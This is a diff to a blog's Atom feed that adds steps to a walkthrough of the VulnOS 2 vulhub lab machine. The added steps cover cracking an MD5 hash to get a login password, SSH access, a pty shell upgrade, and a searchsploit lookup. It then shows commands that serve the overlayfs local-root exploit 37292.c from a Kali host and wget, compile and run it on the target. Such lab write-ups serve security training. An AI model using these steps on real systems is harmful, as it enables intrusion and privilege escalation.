@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-20T15:20:18-05:00</updated>
+  <updated>2016-07-20T16:23:29-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -32,6 +32,12 @@
 
 
 <h3>Vulnerability:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/32075/">OpenDocMan 1.2.7 - Multiple Vulnerabilities</a></li>
+<li><a href="https://www.exploit-db.com/exploits/37293/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
+</ul>
+
 
 <!--more-->
 
@@ -125,6 +131,49 @@
 <p><img src="/images/blog/vulhub/vulos2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>only guest&rsquo;s password is cracked.</p>
+
+<p>Find a very good website to crack MD5 online <a href="http://md5cracker.org/,">http://md5cracker.org/,</a> get the cracked password <code>webmin1980</code> for user webmin, and login:</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>not very helpful.</p>
+
+<p>Try to ssh to the box using webmin</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the bash:</p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>first check the os version</p>
+
+<p><code>uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit 3.13.0</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try this exploit</p>
+
+<p>in Kali:</p>
+
+<pre><code>cp /usr/share/exploitdb/platforms/linux/local/37292.c /var/www/html/.
+service apache2 restart
+</code></pre>
+
+<p>in target:</p>
+
+<pre><code>wget http://192.168.56.101/37292.c .
+gcc 37292.c -o 37292
+./37292
+</code></pre>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
 ]]></content>
   </entry>
   
